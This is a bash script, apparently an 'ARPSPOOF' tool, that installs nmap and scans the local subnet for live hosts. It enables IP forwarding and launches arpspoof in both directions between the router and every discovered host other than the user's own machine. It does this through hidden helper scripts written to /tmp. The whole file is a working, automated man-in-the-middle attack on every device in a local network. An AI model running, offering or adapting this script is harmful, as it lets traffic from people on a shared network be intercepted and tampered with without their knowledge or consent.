#!/bin/bash

apt-get install gnome-terminal >> /dev/null
apt-get install nmap >> /dev/null

BLUE='\033[1;34m'
BOLD='\033[1m'
COLORF='\033[0m'
GREEN='\033[1;32m'
RED='\033[1;31m'

principal(){
VERIFYINTERNET=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' https://google.com)
if [ "$VERIFYINTERNET" != "000" ]
then
credits
else
echo
echo -e "${BOLD}${RED}NO INTERNET${COLORF}"
exit
fi
}

function credits(){
echo
sleep 0.05    
echo -e "${BOLD}   ###    ########  ########   ######  ########   #######   #######  ######## ${COLORF}"
sleep 0.05
echo -e "${BOLD}  ## ##   ##     ## ##     ## ##    ## ##     ## ##     ## ##     ## ##       ${COLORF}"
sleep 0.05
echo -e "${BOLD} ##   ##  ##     ## ##     ## ##       ##     ## ##     ## ##     ## ##       ${COLORF}"
sleep 0.05
echo -e "${BOLD}##     ## ########  ########   ######  ########  ##     ## ##     ## ######   ${COLORF}"
sleep 0.05
echo -e "${BOLD}######### ##   ##   ##              ## ##        ##     ## ##     ## ##       ${COLORF}"
sleep 0.05
echo -e "${BOLD}##     ## ##    ##  ##        ##    ## ##        ##     ## ##     ## ##       ${COLORF}"
sleep 0.05
echo -e "${BOLD}##     ## ##     ## ##         ######  ##         #######   #######  ##       ${COLORF}"
sleep 0.05
echo
sleep 0.05
echo -e "${BOLD}===============================================${COLORF}"
sleep 0.05
echo -e "${BOLD}Script developed by:${COLORF} ${BLUE}Eduardo Buzzi${COLORF}"
sleep 0.05
echo -e "${BOLD}More scripts in:${COLORF} ${BLUE}https://github.com/edubuzzi${COLORF}"
sleep 0.05
echo -e "${BOLD}===============================================${COLORF}"
sleep 0.05
interfaces
}

function interfaces(){
echo
INTERFACES=$(ip addr show | grep -v "lo" | grep -v "/" | grep -v "valid" | cut -d '<' -f1 | cut -d ':' -f2 | tr -d " ")
if [ "$INTERFACES" != "" ]
then
echo -e "${BOLD}Your active Network interface(s)${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}$INTERFACES${COLORF}"
sleep 0.05
echo
read -p "SELECT INTERFACE TO USE => " INTERFACE
else
echo -e "${BOLD}${RED}No network adapter found${COLORF}"
sleep 0.05
echo
exit
fi
discoverIPs
}

discoverIPs(){

RAN=$(shuf -i 1000-5000 -n 1)
IP=$(hostname -I | cut -d ' ' -f 1 | cut -d '.' -f 1-3)
YOURIP=$(hostname -I | cut -d ' ' -f 1)
GATEWAY="$IP.1"
SCAN=$(nmap -sn $IP.0/24 -oG .scan$RAN)
LISTAIPS=$(cat .scan$RAN | grep "Up" | cut -d ' ' -f 2 > .lista$RAN)
rm .scan$RAN >> /dev/null
NUMIPS=$(wc -l .lista$RAN | cut -d ' ' -f 1)
#INTERFACE="wlan0"
loop
}

loop(){
for i in $(seq 1 $NUMIPS)
do
	touch /tmp/.arpspoof >> /dev/null
	touch /tmp/.arpspoof1 >> /dev/null
	touch /tmp/.arpspoof2 >> /dev/null
	chmod +x /tmp/.arpspoof >> /dev/null
	chmod +x /tmp/.arpspoof1 >> /dev/null
	chmod +x /tmp/.arpspoof2 >> /dev/null
	if [ $i == 1 ]
	then
	echo 'echo "1" > /proc/sys/net/ipv4/ip_forward' >> /tmp/.arpspoof
	fi
	echo "INTERFACE="$INTERFACE"" >> /tmp/.arpspoof
	echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.arpspoof
	echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.arpspoof
	echo 'then' >> /tmp/.arpspoof
	echo 'exit' >> /tmp/.arpspoof
	echo "fi" >> /tmp/.arpspoof
	echo "TARGET=$(cat .lista"$RAN" | head -n "$i" | tail -n 1)" >> /tmp/.arpspoof
	TARGET=$(cat .lista"$RAN" | head -n $i | tail -n 1)
	if [ "$TARGET" = "$YOURIP" ]
	then
	continue
	fi
	if [ "$TARGET" = "$GATEWAY" ]
	then
	continue
	fi 
	echo "ROUTER="$GATEWAY"" >> /tmp/.arpspoof
	echo "echo "\"arpspoof -i ""'$INTERFACE'"" -t ""'$ROUTER'"" ""'$TARGET'"""\""" >> /tmp/.arpspoof1" >> /tmp/.arpspoof
	echo "echo "\"arpspoof -i ""'$INTERFACE'"" -t ""'$TARGET'"" ""'$ROUTER'"""\""" >> /tmp/.arpspoof2" >> /tmp/.arpspoof
	echo "gnome-terminal --tab -- "\"/tmp/.arpspoof1"\" >> /dev/null" >> /tmp/.arpspoof
	echo "gnome-terminal --tab -- "\"/tmp/.arpspoof2"\" >> /dev/null" >> /tmp/.arpspoof
	echo "rm /tmp/.arpspoof1" >> /tmp/.arpspoof
	echo "rm /tmp/.arpspoof2" >> /tmp/.arpspoof
	echo "exit" >> /tmp/.arpspoof
	gnome-terminal --tab -- "/tmp/.arpspoof" >> /dev/null
	rm /tmp/.arpspoof >> /dev/null
	sleep 2
done
rm .lista$RAN
}
principal
